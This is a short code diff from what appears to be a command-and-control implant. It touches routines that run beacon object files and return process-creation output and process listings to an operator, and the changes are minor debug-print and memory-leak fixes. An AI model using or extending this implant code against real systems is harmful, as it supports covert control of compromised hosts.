@@ -140,7 +140,7 @@ auto DECLFN Task::ExecBof(
     BYTE* BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );
 
     KhDbg("bof id  : %d", BofCmdID);
-    KhDbg("bof args: %s", BofArgs);
+    KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);
 
     Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );
 
@@ -1367,6 +1367,11 @@ auto DECLFN Task::Process(
 
             Self->Pkg->Int32( Package, PsInfo.dwProcessId );
             Self->Pkg->Int32( Package, PsInfo.dwThreadId  );
+
+            if ( Self->Ps->Out.p ) {
+                Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
+                Self->Hp->Free( Self->Ps->Out.p );
+            } 
             
             break;
         }
@@ -1480,11 +1485,11 @@ auto DECLFN Task::Process(
 
             } while ( SysProcInfo->NextEntryOffset );
 
+            if ( ValToFree ) Self->Hp->Free( ValToFree );
+
             break;
         }
     } 
-
-    if ( G_PACKAGE ) G_PACKAGE = nullptr;
 
     KhRetSuccess;
 }
